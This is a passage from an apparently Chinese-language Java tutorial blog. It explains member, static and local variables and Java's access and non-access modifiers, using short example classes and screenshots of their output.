class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Variable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> instanceVar;       <span class="comment">//成员变量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> staticVar;  <span class="comment">//静态变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(<span class="keyword">int</span> paramVar)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> localVar = <span class="number">10</span>;         <span class="comment">//局部变量localVar=10</span></span><br><span class="line"></span><br><span class="line">        instanceVar = localVar;    <span class="comment">//成员变量instanceVar=10</span></span><br><span class="line">        staticVar = paramVar;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;成员变量instanceVar: &quot;</span> + instanceVar);</span><br><span class="line">        System.out.println(<span class="string">&quot;静态变量staticVar: &quot;</span> + staticVar);</span><br><span class="line">        System.out.println(<span class="string">&quot;参数变量paramVar: &quot;</span> + paramVar);</span><br><span class="line">        System.out.println(<span class="string">&quot;局部变量localVar: &quot;</span> + localVar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Variable test = <span class="keyword">new</span> Variable();</span><br><span class="line">        test.method(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509001436.png"></p><p>运行以上代码，输出如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509001506.png"></p><h2 id="成员变量（实例变量）"><a href="#成员变量（实例变量）" class="headerlink" title="成员变量（实例变量）"></a>成员变量（实例变量）</h2><ul><li>成员变量声明在一个类中，但在方法、构造方法和语句块之外。</li><li>当一个对象被实例化之后，每个成员变量的值就跟着确定。</li><li>成员变量在对象创建的时候创建，在对象被销毁的时候销毁。</li><li>成员变量的值应该至少被一个方法、构造方法或者语句块引用，使得外部能够通过这些方式获取实例变量信息。</li><li>成员变量可以声明在使用前或者使用后。</li><li>访问修饰符可以修饰成员变量。</li><li>成员变量对于类中的方法、构造方法或者语句块是可见的。一般情况下应该把成员变量设为私有。通过使用访问修饰符可以使成员变量对子类可见。</li><li>成员变量具有默认值。数值型变量的默认值是0，布尔型变量的默认值是 false，引用类型变量的默认值是 null。变量的值可以在声明时指定，也可以在构造方法中指定；</li><li>成员变量可以直接通过变量名访问。但在静态方法以及其他类中，就应该使用完全限定名：<code>ObjectReference.VariableName</code>。</li></ul><p>成员变量的声明语法为：</p><p><code>accessModifier type variableName;</code></p><ul><li>accessModifier ——表示访问修饰符，可以是 public、protected、private 或默认访问级别（即没有显式指定访问修饰符）。</li><li>type ——表示变量的类型。</li><li>variableName —— 表示变量的名称。</li></ul><p>与局部变量不同，成员变量的值在创建对象时被分配，即使未对其初始化，它们也会被赋予默认值，例如 int 类型的变量默认值为 0，boolean 类型的变量默认值为 false。</p><p>成员变量可以通过对象访问，也可以通过类名访问（如果它们是静态成员变量）。如果没有显式初始化成员变量，则它们将被赋予默认值。可以在构造函数或其他方法中初始化成员变量，或者通过对象或类名访问它们并设置它们的值。</p><p><strong>实例：</strong></p><p>声明了两个成员变量 a 和 b，并对其进行了访问和设置。注意，我们可以通过对象访问成员变量（如obj.a），也可以通过类名访问静态成员变量（MyClass.count，其中MyClass是类名，count是静态成员变量）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VariableTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> a;   <span class="comment">// 私有成员变量a</span></span><br><span class="line">    <span class="keyword">public</span> String b = <span class="string">&quot;sigma&quot;</span>;      <span class="comment">// 公有成员变量b</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        VariableTest obj = <span class="keyword">new</span> VariableTest(); <span class="comment">// 声明并创建对象obj</span></span><br><span class="line">        obj.a = <span class="number">10</span>;                <span class="comment">// 访问成员变量a，并设置其值为10</span></span><br><span class="line">        System.out.println(<span class="string">&quot;a=&quot;</span> + obj.a);</span><br><span class="line">        obj.b = <span class="string">&quot;S1GMA&quot;</span>;          <span class="comment">// 访问成员变量b，并设置其值为&quot;S1GMA&quot;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;b=&quot;</span> + obj.b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509141522.png"></p><p>以上实例编译运行结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509141727.png"></p><h2 id="静态变量（类变量）"><a href="#静态变量（类变量）" class="headerlink" title="静态变量（类变量）"></a>静态变量（类变量）</h2><p>Java 中的静态变量是指在类中定义的一个变量，它与类相关而不是与实例相关，即无论创建多少个类实例，静态变量在内存中只有一份拷贝，被所有实例共享。</p><p>静态变量在类加载时被创建，<em><strong>在整个程序运行期间都存在</strong></em>。</p><h3 id="定义方式"><a href="#定义方式" class="headerlink" title="定义方式"></a>定义方式</h3><p>静态变量的定义方式是在类中使用 <strong>static</strong> 关键字修饰变量，通常也称为类变量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">0</span>;   <span class="comment">//定义一个静态变量 count ，其初始值为 0：</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h3><p>可以通过类名来访问静态变量（MyClass.count），也可以通过实例名来访问静态变量（obj.count ）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MyClass.count = <span class="number">10</span>; <span class="comment">// 通过类名访问</span></span><br><span class="line">MyClass obj = <span class="keyword">new</span> MyClass();</span><br><span class="line">obj.count = <span class="number">20</span>; <span class="comment">// 通过实例名访问</span></span><br></pre></td></tr></table></figure><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p><strong>静态变量的生命周期与程序的生命周期一样长</strong>，即它们在类加载时被创建，<strong>在整个程序运行期间都存在</strong>，直到程序结束才会被销毁。因此，<strong>静态变量可以用来存储整个程序都需要使用的数据</strong>，如配置信息、全局变量等。</p><h3 id="初始化时机"><a href="#初始化时机" class="headerlink" title="初始化时机"></a>初始化时机</h3><p>静态变量在类加载时被初始化，其初始化顺序与定义顺序有关。</p><p>如果一个静态变量依赖于另一个静态变量，那么它必须在后面定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> count2 = count1 + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 其他成员变量和方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//count1 要先于 count2 初始化，否则编译时会报错。</span></span><br></pre></td></tr></table></figure><h3 id="常量和静态变量的区别"><a href="#常量和静态变量的区别" class="headerlink" title="常量和静态变量的区别"></a>常量和静态变量的区别</h3><p>常量也是与类相关的，但它是用 <code>final</code>关键字修饰的变量，<strong>一旦被赋值就不能再修改</strong>。与静态变量不同的是，常量在编译时就已经确定了它的值，而静态变量的值可以在运行时改变。另外，常量通常用于存储一些固定的值，如数学常数、配置信息等，而静态变量通常用于存储可变的数据，如计数器、全局状态等。</p><p>总之，静态变量是与类相关的变量，具有唯一性和共享性，可以用于存储整个程序都需要使用的数据，但需要注意初始化时机和与常量的区别。</p><h3 id="静态变量的访问修饰符"><a href="#静态变量的访问修饰符" class="headerlink" title="静态变量的访问修饰符"></a>静态变量的访问修饰符</h3><p>静态变量的访问修饰符可以是 public、protected、private 或者默认的访问修饰符（即不写访问修饰符）。</p><p>需要注意的是，静态变量的访问权限与实例变量不同，因为静态变量是与类相关的，不依赖于任何实例。</p><h3 id="静态变量的线程安全性"><a href="#静态变量的线程安全性" class="headerlink" title="静态变量的线程安全性"></a>静态变量的线程安全性</h3><p>由于静态变量是共享的，所以需要注意其线程安全性。多个线程同时对静态变量进行读写操作可能会导致数据不一致或者出现竞态条件。因此，在多线程环境中使用静态变量时需要进行同步操作或者使用线程安全的方式访问。</p><h3 id="静态变量的命名规范"><a href="#静态变量的命名规范" class="headerlink" title="静态变量的命名规范"></a>静态变量的命名规范</h3><p>静态变量的命名规范与实例变量相同，一般采用驼峰命名法，并且要用 static 关键字明确标识。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public class MyClass &#123;</span><br><span class="line">    public static int MAX_COUNT = 100;</span><br><span class="line">    // 其他成员变量和方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态变量的使用场景"><a href="#静态变量的使用场景" class="headerlink" title="静态变量的使用场景"></a>静态变量的使用场景</h3><p>静态变量通常用于以下场景：</p><ul><li>存储全局状态或配置信息</li><li>计数器或统计信息</li><li>缓存数据或共享资源</li><li>工具类的常量或方法</li><li>单例模式中的实例变量</li></ul><h4 id="实例A-2"><a href="#实例A-2" class="headerlink" title="实例A"></a>实例A</h4><p>以下实例定义了一个 AppConfig 类，其中包含了三个静态变量 APP_NAME、APP_VERSION 和 DATABASE_URL，用于存储应用程序的名称、版本和数据库连接URL。这些变量都被声明为 final，表示它们是不可修改的常量。</p><p>在 main() 方法中，我们打印出了这些静态变量的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppConfig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String APP_NAME = <span class="string">&quot;MyApp&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String APP_VERSION = <span class="string">&quot;1.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DATEBASE_URL = <span class="string">&quot;jdbc:mysql://localhost:4000/mydb&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;APP name: &quot;</span> + AppConfig.APP_NAME);</span><br><span class="line">        System.out.println(<span class="string">&quot;APP version: &quot;</span> + AppConfig.APP_VERSION);</span><br><span class="line">        System.out.println(<span class="string">&quot;Datebase URL: &quot;</span> + AppConfig.DATEBASE_URL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509154435.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509154738.png"></p><p>可以看到，这些静态变量存储的全局配置信息可以在整个程序中使用，并且不会被修改。通过它可以很方便地存储全局配置信息，或者实现其他需要全局共享的数据。</p><h4 id="实例B-1"><a href="#实例B-1" class="headerlink" title="实例B"></a>实例B</h4><p>以下实例定义了一个 Counter 类，其中包含了一个静态变量 count，用于记录创建了多少个 Counter 对象。</p><p>每当创建一个新的对象时，构造方法会将计数器加一。静态方法 getCount() 用于获取当前计数器的值。</p><p>在 main() 方法中，我们创建了三个 Counter 对象，并打印出了计数器的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Counter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Counter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Counter cnta = <span class="keyword">new</span> Counter();</span><br><span class="line">        Counter cntb = <span class="keyword">new</span> Counter();</span><br><span class="line">        Counter cntc = <span class="keyword">new</span> Counter();</span><br><span class="line">        System.out.println(<span class="string">&quot;目前为止创建的对象数：&quot;</span> + Counter.getCount());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509155452.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509155601.png"></p><p>可以看到，计数器记录了创建了三个对象。这个例子展示了静态变量的一个简单应用，通过它我们可以很方便地统计对象的创建次数，或者记录其他需要全局共享的数据。</p><h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><p>Java语言提供了很多修饰符，主要分为以下两类：</p><ul><li>访问修饰符</li><li>非访问修饰符</li></ul><p>修饰符用来定义类、方法或者变量，通常放在语句的最前端。</p><p>如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> myFlag;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> weeks = <span class="number">9.5</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOXWIDTH = <span class="number">42</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><p>Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。</p><ul><li><strong>default</strong> (即默认，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。</li><li><strong>private</strong> : 在同一类内可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong></li><li><strong>public</strong> : 对所有类可见。使用对象：类、接口、变量、方法</li><li><strong>protected</strong> : 对同一包内的类和所有子类可见。使用对象：变量、方法。 <strong>注意：不能修饰类（外部类）</strong>。</li></ul><table><thead><tr><th align="left">修饰符</th><th align="left">当前类</th><th align="left">同一包内</th><th align="left">子孙类(同一包)</th><th align="left">子孙类(不同包)</th><th align="left">其他包</th></tr></thead><tbody><tr><td align="left"><code>public</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td></tr><tr><td align="left"><code>protected</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">Y/N（<a href="https://www.runoob.com/java/java-modifier-types.html#protected-desc">说明</a>）</td><td align="left">N</td></tr><tr><td align="left"><code>default</code></td><td align="left">Y</td><td align="left">Y</td><td align="left">Y</td><td align="left">N</td><td align="left">N</td></tr><tr><td align="left"><code>private</code></td><td align="left">Y</td><td align="left">N</td><td align="left">N</td><td align="left">N</td><td align="left">N</td></tr></tbody></table><h3 id="默认访问修饰符-不使用任何关键字"><a href="#默认访问修饰符-不使用任何关键字" class="headerlink" title="默认访问修饰符-不使用任何关键字"></a>默认访问修饰符-不使用任何关键字</h3><p>使用默认访问修饰符声明的变量和方法，对同一个包内的类是可见的。接口里的变量都隐式声明为 <strong>public static final</strong>,而接口里的方法默认情况下访问权限为 <strong>public</strong>。</p><p>如下例所示，变量和方法的声明可以不使用任何修饰符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String version = <span class="string">&quot;1.5.1&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">processOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="私有访问修饰符-private"><a href="#私有访问修饰符-private" class="headerlink" title="私有访问修饰符-private"></a>私有访问修饰符-private</h3><p>私有访问修饰符是最严格的访问级别，所以被声明为 <strong>private</strong> 的方法、变量和构造方法只能被所属类访问，并且<u>类</u>和<u>接口</u>不能声明为 <strong>private</strong>。</p><p>声明为私有访问类型的变量只能通过类中公共的 getter 方法被外部类访问。</p><p>Private 访问修饰符的使用主要用来隐藏类的实现细节和保护类的数据。</p><p>下面的类使用了私有访问修饰符-private：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String format;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFormat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.format;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFromat</span><span class="params">(String format)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.format = format;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例中，Logger 类中的 format 变量为私有变量，所以其他类不能直接得到和设置该变量的值。为了使其他类能够操作该变量，定义了两个 public 方法：getFormat() （返回 format的值）和 setFormat(String)（设置 format 的值）</p><h3 id="公有访问修饰符-public"><a href="#公有访问修饰符-public" class="headerlink" title="公有访问修饰符-public"></a>公有访问修饰符-public</h3><p>被声明为 public 的类、方法、构造方法和接口能够被任何其他类访问。</p><p>如果几个相互访问的 public 类分布在不同的包中，则需要导入相应 public 类所在的包。由于类的继承性，类所有的公有方法和变量都能被其子类继承。</p><p>以下函数使用了公有访问控制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Java 程序的 main() 方法必须设置成公有的（public）</strong>，否则，Java 解释器将不能运行该类。</p><h3 id="受保护的访问修饰符-protected"><a href="#受保护的访问修饰符-protected" class="headerlink" title="受保护的访问修饰符-protected"></a>受保护的访问修饰符-protected</h3><p>protected 需要从以下两个点来分析说明：</p><ul><li><strong>子类与基类在同一包中</strong>：被声明为 protected 的变量、方法和构造器(构造方法)能被同一个包中的任何其他类访问；</li><li><strong>子类与基类不在同一包中</strong>：那么在子类中，子类实例可以访问其从父类继承而来的 protected 方法，而不能访问基类实例的protected方法。</li></ul><p>protected 可以修饰数据成员，构造方法，方法成员，<strong>不能修饰类（内部类除外）</strong>。</p><p>接口及接口的成员变量和成员方法不能声明为 protected。 可以看看下图演示：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/java-protected.gif"></p><p>子类能访问 protected 修饰符声明的方法和变量，这样就能保护不相关的类使用这些方法和变量。</p><p>下面的父类使用了 protected 访问修饰符，子类重写了父类的 openSpeaker() 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AudioPlayer</span></span>&#123;</span><br><span class="line">    <span class="function">portected <span class="keyword">boolean</span> <span class="title">openSpeaker</span><span class="params">(Speaker sp)</span></span>&#123;</span><br><span class="line">        <span class="comment">//实现细节2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamingAudioPlayer</span> <span class="keyword">extends</span> <span class="title">AudioPlayer</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">openSpeaker</span><span class="params">(Speaker sp)</span> </span>&#123;</span><br><span class="line">      <span class="comment">// 实现细节2</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果把 openSpeaker() 方法声明为 private，那么除了 AudioPlayer 外，其他类将不能访问该方法。</p><p>如果把 openSpeaker() 声明为 public，那么所有的类都能够访问该方法。</p><p>如果我们只想让该方法对其所在类的子类可见，则将该方法声明为 protected。</p><h3 id="访问控制和继承"><a href="#访问控制和继承" class="headerlink" title="访问控制和继承"></a>访问控制和继承</h3><p>请注意以下方法继承的规则：</p><ul><li>父类中声明为 public 的方法在子类中也必须为 public。</li><li>父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。</li><li>父类中声明为 private 的方法，不能够被子类继承。</li></ul><h2 id="非访问修饰符"><a href="#非访问修饰符" class="headerlink" title="非访问修饰符"></a>非访问修饰符</h2><p>static 修饰符——用来修饰类方法和类变量。</p><p>final 修饰符——用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。</p><p>abstract 修饰符——用来创建抽象类和抽象方法。</p><p>synchronized 和 volatile 修饰符——主要用于线程的编程。</p><h3 id="static-修饰符"><a href="#static-修饰符" class="headerlink" title="static 修饰符"></a>static 修饰符</h3><ul><li><p><strong>静态变量：</strong></p><p>static 关键字用来声明独立于对象的静态变量，<strong>无论一个类实例化多少对象，它的静态变量只有一份拷贝</strong>。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。</p></li><li><p><strong>静态方法：</strong></p><p>static 关键字用来声明独立于对象的静态方法。<u>静态方法不能使用类的非静态变量</u>。静态方法从参数列表得到数据，然后计算这些数据。</p></li></ul><p>对类变量和方法的访问可以直接使用 <strong>classname.variablename</strong> 和 <strong>classname.methodname</strong> 的方式访问。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstanceCounter</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> numInstances = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numInstances;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        numInstances++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InstanceCounter()&#123;</span><br><span class="line">        InstanceCounter.addInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Starting with &quot;</span> + InstanceCounter.getCount() + <span class="string">&quot; instances&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">500</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">new</span> InstanceCounter();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Created &quot;</span> + InstanceCounter.getCount() + <span class="string">&quot; instances&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509180220.png"></p><p>运行编辑结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/20230509180300.png"></p><h3 id="final-修饰符"><a href="#final-修饰符" class="headerlink" title="final 修饰符"></a>final 修饰符</h3><p><strong>final 变量：</strong></p><p>final 表示”最后的、最终的”含义，<strong>变量一旦赋值后，不能被重新赋值</strong>。被 final 修饰的实例变量必须显式指定初始值。</p><p>final 修饰符通常和 static 修饰符一起使用来创建类常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">  <span class="comment">// 下面是声明常量的实例</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BOXWIDTH = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">final</span> String TITLE = <span class="string">&quot;Manager&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeValue</span><span class="params">()</span></span>&#123;</span><br><span class="line">     value = <span class="number">12</span>; <span class="comment">//将输出一个错误(因为value被final修饰了，不能被重新赋值)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>final 方法</strong></p><p><strong>父类中的 final 方法可以被子类继承，但是不能被子类重写。</strong></p><p>声明 final 